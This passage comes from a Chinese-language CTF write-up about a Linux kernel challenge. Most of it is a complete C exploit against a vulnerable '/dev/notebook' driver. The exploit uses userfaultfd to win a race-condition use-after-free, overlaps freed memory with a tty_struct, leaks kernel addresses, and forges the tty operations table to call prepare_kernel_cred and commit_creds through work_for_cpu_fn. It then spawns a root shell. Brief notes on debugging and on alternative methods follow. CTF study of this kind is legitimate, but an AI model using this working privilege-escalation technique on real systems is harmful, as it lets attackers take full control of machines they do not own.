</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_API, <span style=color:#666>&amp;</span>ua) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_API&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	ur.range.start <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>)fault_page; <span style=color:#60a0b0;font-style:italic>//我们要监视的区域
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	ur.range.len   <span style=color:#666>=</span> PAGE_SIZE;
</span></span><span style=display:flex><span>	ur.mode        <span style=color:#666>=</span> UFFDIO_REGISTER_MODE_MISSING;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_REGISTER, <span style=color:#666>&amp;</span>ur) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic>//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		ErrExit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_REGISTER&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>//开一个线程，接收错误的信号，然后处理
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>int</span> s <span style=color:#666>=</span> pthread_create(<span style=color:#666>&amp;</span>thr, <span style=color:#007020>NULL</span>,handler, (<span style=color:#902000>void</span><span style=color:#666>*</span>)uffd);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (s<span style=color:#666>!=</span><span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] pthread_create&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>noteadd</span>(size_t idx, size_t size, <span style=color:#902000>void</span><span style=color:#666>*</span> buf)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> idx;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> size;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> buf;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x100</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>notegift</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> buf)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> buf;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x64</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>notedel</span>(size_t idx)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> idx;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x200</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>noteedit</span>(size_t idx, size_t size, <span style=color:#902000>void</span><span style=color:#666>*</span> buf)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> idx;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> size;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> buf;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x300</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>OpenNote</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	note_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/notebook&#34;</span>, O_RDWR);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (note_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] err in open notebook device&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_sleep3_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler created&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler unblocked&#34;</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>3</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler done&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_stuck_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] stuck handler created&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] stuck handler unblocked&#34;</span>);
</span></span><span style=display:flex><span>	pause();
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] stuck handler done&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>edit_thread</span>(<span style=color:#902000>int</span> idx)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] edit thread start!&#34;</span>);
</span></span><span style=display:flex><span>	noteedit(idx, <span style=color:#40a070>0</span>, stuck_mapped_memory);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] edit thread end!&#34;</span>); <span style=color:#60a0b0;font-style:italic>// won&#39;t reach here
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>add_thread</span>(<span style=color:#902000>int</span> idx)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] add thread start!&#34;</span>);
</span></span><span style=display:flex><span>	noteadd(idx, <span style=color:#40a070>0x60</span>, stuck_mapped_memory);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] add thread end!&#34;</span>); <span style=color:#60a0b0;font-style:italic>// won&#39;t reach here
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>char</span> buf_a[<span style=color:#40a070>0x500</span>] <span style=color:#666>=</span> {<span style=color:#4070a0>&#34;aaa&#34;</span>};
</span></span><span style=display:flex><span>size_t buf_tty[<span style=color:#40a070>0x100</span>], buf_fake_table[<span style=color:#40a070>0x500</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> pid;
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> tty_fd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	stuck_mapped_memory <span style=color:#666>=</span> mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_ANONYMOUS <span style=color:#666>|</span> MAP_PRIVATE, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	OpenNote();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	noteadd(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x60</span>, buf_a);
</span></span><span style=display:flex><span>	noteadd(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x60</span>, buf_a);
</span></span><span style=display:flex><span>	noteedit(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x500</span>, buf_a);
</span></span><span style=display:flex><span>	noteedit(<span style=color:#40a070>0</span>, TTY_STRUCT_SZIE, buf_a);
</span></span><span style=display:flex><span>	write(note_fd, buf_a, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	pthread_t thr_edit, thr_add;
</span></span><span style=display:flex><span>	pthread_create(<span style=color:#666>&amp;</span>thr_edit, <span style=color:#007020>NULL</span>, edit_thread, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	pthread_create(<span style=color:#666>&amp;</span>thr_add, <span style=color:#007020>NULL</span>, add_thread, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;ready to open ptmx&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> <span style=color:#40a070>20</span>; i<span style=color:#666>++</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		tty_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/ptmx&#34;</span>, O_RDWR);
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (tty_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			ErrExit(<span style=color:#4070a0>&#34;[-] ptmx open failed!&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		read(note_fd, buf_tty, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (buf_tty[<span style=color:#40a070>0</span>] <span style=color:#666>==</span> <span style=color:#40a070>0x100005401</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			printf(<span style=color:#4070a0>&#34;[+] tty_struct found! fd = %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, tty_fd);
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>; <span style=color:#60a0b0;font-style:italic>// tty_struct used our slab
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (buf_tty[<span style=color:#40a070>0</span>] <span style=color:#666>!=</span> <span style=color:#40a070>0x100005401</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] leak failed&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	size_t ptm_unix98_ops_addr <span style=color:#666>=</span> buf_tty[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> ((ptm_unix98_ops_addr <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFF</span>) <span style=color:#666>==</span> <span style=color:#40a070>0x320</span>) ptm_unix98_ops_addr <span style=color:#666>+=</span> <span style=color:#40a070>0x120</span>;
</span></span><span style=display:flex><span>	size_t work_for_cpu_fn_addr <span style=color:#666>=</span>  work_for_cpu_fn_off <span style=color:#666>+</span> ptm_unix98_ops_addr;
</span></span><span style=display:flex><span>	size_t tty_struct_addr <span style=color:#666>=</span> buf_tty[<span style=color:#40a070>10</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x50</span>;
</span></span><span style=display:flex><span>	size_t commit_creds_addr <span style=color:#666>=</span> commit_creds_off <span style=color:#666>+</span> ptm_unix98_ops_addr;
</span></span><span style=display:flex><span>	size_t prepare_kernel_cred_addr <span style=color:#666>=</span> prepare_kernel_cred_off <span style=color:#666>+</span> ptm_unix98_ops_addr;
</span></span><span style=display:flex><span>	kernel_base <span style=color:#666>=</span> prepare_kernel_cred_addr <span style=color:#666>-</span> <span style=color:#40a070>0xA9EF0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] ptm_unix98_ops addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, ptm_unix98_ops_addr);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] work_for_cpu_fn addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, work_for_cpu_fn_addr);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] prepare_kernel_cred addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, prepare_kernel_cred_addr);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] tty_struct addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, tty_struct_addr);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	size_t buf_gift[<span style=color:#40a070>0x100</span>];
</span></span><span style=display:flex><span>	notegift(buf_gift);
</span></span><span style=display:flex><span>	size_t note_0_addr <span style=color:#666>=</span> buf_gift[<span style=color:#40a070>0</span> <span style=color:#666>*</span> <span style=color:#40a070>2</span>];
</span></span><span style=display:flex><span>	size_t note_1_addr <span style=color:#666>=</span> buf_gift[<span style=color:#40a070>1</span> <span style=color:#666>*</span> <span style=color:#40a070>2</span>];
</span></span><span style=display:flex><span>	assert(note_0_addr <span style=color:#666>==</span> tty_struct_addr);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] note_1 addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, note_1_addr);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> <span style=color:#40a070>0x100005401</span>;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> note_1_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> prepare_kernel_cred_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>5</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	write(note_fd, buf_tty, <span style=color:#40a070>0</span>); <span style=color:#60a0b0;font-style:italic>// write to tty_struct
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>	buf_fake_table[<span style=color:#40a070>7</span>] <span style=color:#666>=</span> work_for_cpu_fn_addr;
</span></span><span style=display:flex><span>	buf_fake_table[<span style=color:#40a070>10</span>] <span style=color:#666>=</span> work_for_cpu_fn_addr;
</span></span><span style=display:flex><span>	buf_fake_table[<span style=color:#40a070>12</span>] <span style=color:#666>=</span> work_for_cpu_fn_addr;
</span></span><span style=display:flex><span>	write(note_fd, buf_fake_table, <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// write(tty_fd, buf_a, 1);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	ioctl(tty_fd, <span style=color:#40a070>233</span>, <span style=color:#40a070>233</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	read(note_fd, buf_tty, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] prepare_kernel_cred finished, return 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, buf_tty[<span style=color:#40a070>6</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> <span style=color:#40a070>0x100005401</span>;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> note_1_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> commit_creds_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>5</span>] <span style=color:#666>=</span> buf_tty[<span style=color:#40a070>6</span>];
</span></span><span style=display:flex><span>	write(note_fd, buf_tty, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// write(tty_fd, buf_a, 1);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	ioctl(tty_fd, <span style=color:#40a070>233</span>, <span style=color:#40a070>233</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;now uid = %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, getuid());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (getuid() <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		puts(<span style=color:#4070a0>&#34;[+] root now!&#34;</span>);
</span></span><span style=display:flex><span>		system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>顺带提一下我如何发现会先调用 tty_write 的，因为有一次尝试时我把 exp 中的 buf_tty 先清零了再写回到 tty_struct，然后再做 wirte 操作，想看看是不是成员变量会影响调用，结果触发了 kernel panic，错误信息是 magic num 不对。这让我觉得有点奇怪，work_for_cpu_fn 里面肯定不会检测魔数，所以就仔细看了一下 panic 时一闪即过的错误信息，发现函数调用回溯中有 tty_write 这个函数，就把源码拿来看了看，才知道自己的错误。</p><p>最后总结一下，其实这道题并不算难，逆向难度不大，思路也很明显，就是条件竞争 UAF，然后可以利用 work_for_cpu_fn 便捷地提权，事实上 tty attack rop 和劫持 modprobe_path 都是可用的方法。不过我这里就不用他们复现了。</p><p>slub 的分配机制还是有必要再研究一下，客观来说还是有点令我迷惑的。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/kernel-pwn>kernel-pwn</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/jchu95495236 rel=me title=Twitter><i data-feather=twitter></i></a>
